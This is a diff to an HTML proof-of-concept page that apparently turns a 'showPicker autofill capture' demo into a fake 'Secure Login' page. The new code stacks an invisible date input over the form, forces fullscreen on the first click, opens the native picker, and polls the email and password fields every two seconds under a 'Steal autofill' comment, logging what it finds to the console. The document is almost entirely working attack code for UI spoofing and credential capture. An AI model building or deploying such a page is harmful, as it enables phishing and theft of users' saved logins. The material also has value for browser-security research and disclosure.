@@ -1,53 +1,77 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>showPicker Autofill Capture PoC</title>
+  <title>Secure Login</title>
   <style>
-    body {
+    body, html {
+      margin: 0;
+      padding: 0;
       font-family: sans-serif;
-      margin: 50px;
+      background: #f9f9f9;
     }
-    #spoof, #email {
+    .login-box {
       position: absolute;
-      top: 100px;
-      left: 50px;
-      width: 300px;
-      height: 40px;
+      top: 20%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 350px;
+      background: white;
+      padding: 30px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+      border-radius: 8px;
+      text-align: center;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
       font-size: 16px;
     }
-    #spoof {
-      opacity: 0; /* Invisible */
+    #spoofPicker {
+      position: absolute;
+      top: 40%;
+      left: 50%;
+      transform: translateX(-50%);
+      opacity: 0;
       z-index: 10;
-    }
-    #email {
-      z-index: 1;
     }
   </style>
 </head>
 <body>
 
-<h2>Security Check</h2>
-<p>Please confirm your email:</p>
+<div class="login-box">
+  <h2>Login to Your Account</h2>
+  <input type="text" id="email" name="email" placeholder="Email" autocomplete="email">
+  <input type="password" id="pass" name="password" placeholder="Password" autocomplete="current-password">
+  <button onclick="login()">Login</button>
+</div>
 
-<!-- Fake date picker on top -->
-<input type="date" id="spoof" />
-<!-- Autofill-targeted field -->
-<input type="text" id="email" name="email" autocomplete="email" placeholder="Email">
+<!-- Spoofed date input to trigger picker -->
+<input type="date" id="spoofPicker">
 
 <script>
-const picker = document.getElementById('spoof');
-const email = document.getElementById('email');
+function login() {
+  alert("Login clicked! But this is just spoofed UI 😈");
+}
 
-// Trigger picker UI when user clicks anywhere
-picker.showPicker();
+// Trigger fullscreen
+document.addEventListener("click", () => {
+  document.documentElement.requestFullscreen().then(() => {
+    document.getElementById("spoofPicker").showPicker();
+  });
+}, { once: true });
 
-// Monitor autofill
+// Steal autofill every 2s
 setInterval(() => {
-  if (email.value) {
-    console.log("Captured Autofill Data:", email.value);
-    alert("Your email was autofilled: " + email.value);
+  const email = document.getElementById("email").value;
+  const pass = document.getElementById("pass").value;
+
+  if (email || pass) {
+    console.log("Stolen Autofill 👀");
+    console.log("Email:", email);
+    console.log("Password:", pass);
   }
-}, 1000);
+}, 2000);
 </script>
 
 </body>
